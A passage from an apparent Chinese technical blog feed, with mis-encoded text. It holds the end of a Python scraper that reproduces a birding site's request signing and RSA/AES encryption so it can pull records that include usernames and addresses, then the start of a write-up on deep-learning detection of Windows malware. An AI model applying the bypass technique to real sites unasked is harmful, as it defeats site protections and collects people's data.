class="number">70</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤1: ç”Ÿæˆæ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        timestamp = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤2: ç”ŸæˆrequestId (UUID v4)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        request_id = <span class="variable language_">self</span>.get_uuid()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤3: æ„å»ºè¯·æ±‚æ•°æ® (JSON)</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ³¨æ„: limitå’Œpageå¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹</span></span><br><span class="line">        data = json.dumps(&#123;</span><br><span class="line">            <span class="string">&quot;limit&quot;</span>: <span class="built_in">str</span>(limit),</span><br><span class="line">            <span class="string">&quot;page&quot;</span>: <span class="built_in">str</span>(page)</span><br><span class="line">        &#125;, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))  <span class="comment"># æ— ç©ºæ ¼çš„ç´§å‡‘æ ¼å¼</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“¦ è¯·æ±‚æ•°æ®:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   timestamp: <span class="subst">&#123;timestamp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   requestId: <span class="subst">&#123;request_id&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤4: ç”Ÿæˆç­¾å</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># ç­¾åç®—æ³•: MD5(data + requestId + timestamp)</span></span><br><span class="line">        <span class="comment"># æ³¨æ„: å¿…é¡»åœ¨åŠ å¯†å‰è®¡ç®—ç­¾åï¼</span></span><br><span class="line">        sign_string = data + request_id + <span class="built_in">str</span>(timestamp)</span><br><span class="line">        sign = <span class="variable language_">self</span>.md5_hash(sign_string)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ” ç­¾å:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ç­¾åå­—ç¬¦ä¸²: <span class="subst">&#123;sign_string&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   MD5: <span class="subst">&#123;sign&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤5: RSAåŠ å¯†æ•°æ®</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        encrypted_data = <span class="variable language_">self</span>.encrypt_long(data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> encrypted_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;âŒ æ•°æ®åŠ å¯†å¤±è´¥&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤6: è®¾ç½®è¯·æ±‚å¤´</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># å…³é”®è¯·æ±‚å¤´:</span></span><br><span class="line">        <span class="comment"># - timestamp: æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</span></span><br><span class="line">        <span class="comment"># - requestId: UUID</span></span><br><span class="line">        <span class="comment"># - sign: MD5ç­¾å</span></span><br><span class="line">        headers = <span class="variable language_">self</span>.headers.copy()</span><br><span class="line">        headers[<span class="string">&#x27;timestamp&#x27;</span>] = <span class="built_in">str</span>(timestamp)</span><br><span class="line">        headers[<span class="string">&#x27;requestId&#x27;</span>] = request_id</span><br><span class="line">        headers[<span class="string">&#x27;sign&#x27;</span>] = sign</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="comment"># æ­¥éª¤7: å‘é€POSTè¯·æ±‚</span></span><br><span class="line">        <span class="comment"># =====================================================================</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“¤ å‘é€è¯·æ±‚:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   URL: <span class="subst">&#123;self.api_url&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   åŠ å¯†æ•°æ®é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(encrypted_data)&#125;</span> å­—ç¬¦&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            response = requests.post(</span><br><span class="line">                <span class="variable language_">self</span>.api_url,</span><br><span class="line">                headers=headers,</span><br><span class="line">                data=encrypted_data,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># =================================================================</span></span><br><span class="line">            <span class="comment"># æ­¥éª¤8: å¤„ç†å“åº”</span></span><br><span class="line">            <span class="comment"># =================================================================</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                response_text = response.text</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“¥ æ”¶åˆ°å“åº”:&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   çŠ¶æ€ç : <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   å“åº”é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(response_text)&#125;</span> å­—ç¬¦&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•è§£æJSON</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    result = json.loads(response_text)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># æƒ…å†µ1: æ•´ä¸ªå“åº”æ˜¯åŠ å¯†çš„å­—ç¬¦ä¸²</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">str</span>):</span><br><span class="line">                        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;   æ£€æµ‹åˆ°: æ•´ä¸ªå“åº”æ˜¯åŠ å¯†å­—ç¬¦ä¸²&quot;</span>)</span><br><span class="line">                        decrypted = <span class="variable language_">self</span>.decrypt_response(result)</span><br><span class="line">                        <span class="keyword">if</span> decrypted:</span><br><span class="line">                            <span class="keyword">return</span> json.loads(decrypted)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># æƒ…å†µ2: å“åº”æ˜¯å­—å…¸ï¼Œdataå­—æ®µæ˜¯åŠ å¯†çš„</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;data&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">isinstance</span>(result[<span class="string">&#x27;data&#x27;</span>], <span class="built_in">str</span>):</span><br><span class="line">                            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;   æ£€æµ‹åˆ°: dataå­—æ®µæ˜¯åŠ å¯†å­—ç¬¦ä¸²&quot;</span>)</span><br><span class="line">                            decrypted = <span class="variable language_">self</span>.decrypt_response(result[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">                            <span class="keyword">if</span> decrypted:</span><br><span class="line">                                result[<span class="string">&#x27;data&#x27;</span>] = json.loads(decrypted)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># æƒ…å†µ3: å“åº”æœªåŠ å¯†æˆ–å·²è§£å¯†</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># æƒ…å†µ4: å“åº”ä¸æ˜¯JSONï¼Œå¯èƒ½æ˜¯çº¯åŠ å¯†æ–‡æœ¬</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;   æ£€æµ‹åˆ°: å“åº”ä¸æ˜¯JSONæ ¼å¼&quot;</span>)</span><br><span class="line">                    decrypted = <span class="variable language_">self</span>.decrypt_response(response_text)</span><br><span class="line">                    <span class="keyword">if</span> decrypted:</span><br><span class="line">                        <span class="keyword">return</span> json.loads(decrypted)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;âŒ HTTPé”™è¯¯: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;å“åº”å†…å®¹: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ è¯·æ±‚å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># æµ‹è¯•å‡½æ•°</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_encryption</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æµ‹è¯•RSAåŠ å¯†åŠŸèƒ½&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æµ‹è¯• RSA åŠ å¯†&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    </span><br><span class="line">    api = BirdReportAPI(debug=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æµ‹è¯•æ•°æ®</span></span><br><span class="line">    test_data = <span class="string">&#x27;&#123;&quot;limit&quot;:&quot;20&quot;,&quot;page&quot;:&quot;1&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nåŸå§‹æ•°æ®: <span class="subst">&#123;test_data&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åŠ å¯†</span></span><br><span class="line">    encrypted = api.encrypt_long(test_data)</span><br><span class="line">    <span class="keyword">if</span> encrypted:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nâœ… åŠ å¯†æˆåŠŸ!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;åŠ å¯†ç»“æœï¼ˆå‰100å­—ç¬¦ï¼‰: <span class="subst">&#123;encrypted[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;åŠ å¯†é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(encrypted)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nâŒ åŠ å¯†å¤±è´¥&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æµ‹è¯•å®Œæ•´æµç¨‹&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BirdReport API çˆ¬è™« - å®Œæ•´æµ‹è¯•&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºAPIå®ä¾‹ï¼ˆå¼€å¯è°ƒè¯•æ¨¡å¼ï¼‰</span></span><br><span class="line">    api = BirdReportAPI(debug=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nğŸ”‘ å¯†é’¥ä¿¡æ¯:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES Key: <span class="subst">&#123;api.aes_key_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(api.aes_key)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES IV:  <span class="subst">&#123;api.aes_iv_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(api.aes_iv)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\næœç´¢æ´»åŠ¨ (page=1, limit=20):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ‰§è¡Œæœç´¢</span></span><br><span class="line">    result = api.search(page=<span class="number">1</span>, limit=<span class="number">20</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¤„ç†ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nâœ… è¯·æ±‚æˆåŠŸ&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="comment"># æ£€æŸ¥ API è¿”å›ç </span></span><br><span class="line">            <span class="keyword">if</span> result.get(<span class="string">&#x27;code&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;âœ… APIè¿”å›æˆåŠŸ&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;æ€»æ•°æ®é‡: <span class="subst">&#123;result.get(<span class="string">&#x27;count&#x27;</span>, <span class="number">0</span>):,&#125;</span> æ¡&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> result.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">                    data = result[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">list</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;å½“å‰é¡µè¿”å›: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> æ¡è®°å½•&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“‹ ç¬¬ä¸€æ¡è®°å½•ç¤ºä¾‹:&quot;</span>)</span><br><span class="line">                            first = data[<span class="number">0</span>]</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   ç¼–å·: <span class="subst">&#123;first.get(<span class="string">&#x27;serialId&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   ç”¨æˆ·: <span class="subst">&#123;first.get(<span class="string">&#x27;username&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   åœ°ç‚¹: <span class="subst">&#123;first.get(<span class="string">&#x27;pointName&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   åœ°å€: <span class="subst">&#123;first.get(<span class="string">&#x27;address&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   æ—¶é—´: <span class="subst">&#123;first.get(<span class="string">&#x27;startTime&#x27;</span>)&#125;</span> - <span class="subst">&#123;first.get(<span class="string">&#x27;endTime&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   ç‰©ç§æ•°: <span class="subst">&#123;first.get(<span class="string">&#x27;taxonCount&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;æ•°æ®ç±»å‹: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;âŒ APIé”™è¯¯ (code=<span class="subst">&#123;result.get(<span class="string">&#x27;code&#x27;</span>)&#125;</span>): <span class="subst">&#123;result.get(<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;æœªçŸ¥é”™è¯¯&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ˜¾ç¤ºå®Œæ•´å“åº”ï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span>:  <span class="comment"># è®¾ç½®ä¸ºTrueå¯æŸ¥çœ‹å®Œæ•´JSON</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nå®Œæ•´å“åº”:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(json.dumps(result, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nâŒ è¯·æ±‚å¤±è´¥&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># è¿è¡Œå®Œæ•´æµ‹è¯•</span></span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¦‚æœåªæƒ³æµ‹è¯•åŠ å¯†ï¼Œå–æ¶ˆä¸‹é¢çš„æ³¨é‡Š</span></span><br><span class="line">    <span class="comment"># test_encryption()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¦–å…ˆåˆ†æheaderå¤´éƒ¨çš„signå’ŒrequestIDå¦‚ä½•åŠ å¯†çš„ï¼Œç„¶ååˆ†æå¦‚ä½•å‚æ•°åŠ å¯†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åè¿›è¡Œè¿”å›å€¼çš„AESè§£å¯†å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”è¾ƒç®€å•é€‚åˆå…¥é—¨å­¦ä¹ ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.co</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>natureè®ºæ–‡æ±‡æŠ¥</title>
    <link href="https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/</id>
    <published>2025-10-15T14:24:09.000Z</published>
    <updated>2025-10-15T14:24:53.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®"><a href="#PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®" class="headerlink" title="PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®"></a>PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®</h1><h2 id="é¡¹ç›®æ¦‚è¿°"><a href="#é¡¹ç›®æ¦‚è¿°" class="headerlink" title="é¡¹ç›®æ¦‚è¿°"></a>é¡¹ç›®æ¦‚è¿°</h2><p>æœ¬é¡¹ç›®æ˜¯ä¸€ä¸ªåŸºäºæ·±åº¦å­¦ä¹ çš„PEï¼ˆPortable Executableï¼‰æ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿï¼Œæ—¨åœ¨é€šè¿‡å¤šç§æ·±åº¦å­¦ä¹ ç®—æ³•å¯¹Windowså¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œæ¶æ„æ€§æ£€æµ‹ã€‚é¡¹ç›®é‡‡ç”¨äº†å…¨é¢çš„å®éªŒè®¾è®¡ï¼Œæ¯”è¾ƒäº†10ç§ä¸åŒçš„æ·±åº¦å­¦ä¹ æ¨¡å‹åœ¨æ¶æ„ä»£ç æ£€æµ‹ä»»åŠ¡ä¸Šçš„æ€§èƒ½è¡¨ç°ã€‚</p><h2 id="ğŸ¯-ç ”ç©¶ç›®æ ‡"><a href="#ğŸ¯-ç ”ç©¶ç›®æ ‡" class="headerlink" title="ğŸ¯ ç ”ç©¶ç›®æ ‡"></a>ğŸ¯ ç ”ç©¶ç›®æ ‡</h2><ul><li><strong>ä¸»è¦ç›®æ ‡</strong>ï¼šæ„å»ºé«˜æ•ˆçš„PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ</li><li><strong>æŠ€æœ¯ç›®æ ‡</strong>ï¼šæ¯”è¾ƒå¤šç§æ·±åº¦å­¦ä¹ æ¨¡å‹çš„æ£€æµ‹æ€§èƒ½</li><li><strong>å­¦æœ¯ç›®æ ‡</strong>ï¼šä¸ºæ¶æ„ä»£ç æ£€æµ‹é¢†åŸŸæä¾›å…¨é¢çš„æ¨¡å‹æ€§èƒ½åŸºå‡†</li></ul><h2 id="ğŸ“Š-æ•°æ®é›†æ„å»º"><a href="#ğŸ“Š-æ•°æ®é›†æ„å»º" class="headerlink" title="ğŸ“Š æ•°æ®é›†æ„å»º"></a>ğŸ“Š æ•°æ®é›†æ„å»º</h2><h3 id="æ•°æ®æ¥æº"><a href="#æ•°æ®æ¥æº" class="headerlink" title="æ•°æ®æ¥æº"></a>æ•°æ®æ¥æº</h3><ul><li><strong>æ¶æ„æ ·æœ¬æ¥æº</strong>ï¼šMalwareBazaaræ•°æ®åº“ï¼ˆabuse.chï¼‰</li><li><strong>æ—¶é—´èŒƒå›´</strong>ï¼š2020å¹´2æœˆ-6æœˆçš„æ¶æ„æ ·æœ¬</li><li><strong>æ ·æœ¬æ•°é‡</strong>ï¼šçº¦10,000+æ¶æ„æ ·æœ¬</li><li><strong>æ­£å¸¸æ ·æœ¬</strong>ï¼šç³»ç»ŸPEæ–‡ä»¶å’Œåˆæ³•è½¯ä»¶</li></ul><h3 id="æ•°æ®é¢„å¤„ç†æµç¨‹"><a href="#æ•°æ®é¢„å¤„ç†æµç¨‹" class="headerlink" title="æ•°æ®é¢„å¤„ç†æµç¨‹"></a>æ•°æ®é¢„å¤„ç†æµç¨‹</h3><ol><li><strong>æ ·æœ¬ä¸‹è½½ä¸è§£å‹</strong>ï¼šè‡ªåŠ¨åŒ–ä¸‹è½½æŒ‡å®šæ—¥æœŸèŒƒå›´çš„æ¶æ„æ ·æœ¬</li><li><strong>PEæ–‡ä»¶éªŒè¯</strong>ï¼šéªŒè¯æ–‡ä»¶æ ¼å¼çš„æœ‰æ•ˆæ€§</li><li><strong>ç‰¹å¾æå–</strong>ï¼šä»PEæ–‡ä»¶ç»“æ„ä¸­æå–58ä¸ªé™æ€ç‰¹å¾</li><li><strong>æ•°æ®æ¸…æ´—</strong>ï¼šå¤„ç†ç¼ºå¤±å€¼å’Œå¼‚å¸¸å€¼</li></ol><h2 id="ğŸ”§-ç‰¹å¾å·¥ç¨‹"><a href="#ğŸ”§-ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ğŸ”§ ç‰¹å¾å·¥ç¨‹"></a>ğŸ”§ ç‰¹å¾å·¥ç¨‹</h2><h3 id="PEæ–‡ä»¶ç‰¹å¾ä½“ç³»"><a href="#PEæ–‡ä»¶ç‰¹å¾ä½“ç³»" class="headerlink" title="PEæ–‡ä»¶ç‰¹å¾ä½“ç³»"></a>PEæ–‡ä»¶ç‰¹å¾ä½“ç³»</h3><p>é¡¹ç›®æå–äº†58ä¸ªPEæ–‡ä»¶é™æ€ç‰¹å¾ï¼Œæ¶µç›–ä»¥ä¸‹å‡ ä¸ªç»´åº¦ï¼š</p><h4 id="1-DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰"><a href="#1-DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰" class="headerlink" title="1. DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰"></a>1. DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰</h4><ul><li><code>e_magic</code>ï¼šDOSç­¾å</li><li><code>e_cblp</code>ï¼šæœ€åä¸€é¡µå­—èŠ‚æ•°</li><li><code>e_cp</code>ï¼šæ–‡ä»¶é¡µæ•°</li><li><code>e_lfanew</code>ï¼šPEå¤´åç§»</li><li>ç­‰å…¶ä»–DOSå¤´å­—æ®µ</li></ul><h4 id="2-NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰"><a href="#2-NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰" class="headerlink" title="2. NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰"></a>2. NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰</h4><ul><li><code>machine</code>ï¼šç›®æ ‡æœºå™¨ç±»å‹</li><li><code>number_of_sections</code>ï¼šèŠ‚åŒºæ•°é‡</li><li><code>time_date_stamp</code>ï¼šæ—¶é—´æˆ³</li><li><code>characteristics</code>ï¼šæ–‡ä»¶ç‰¹å¾æ ‡å¿—</li><li>ç­‰</li></ul><h4 id="3-å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰"><a href="#3-å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰" class="headerlink" title="3. å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰"></a>3. 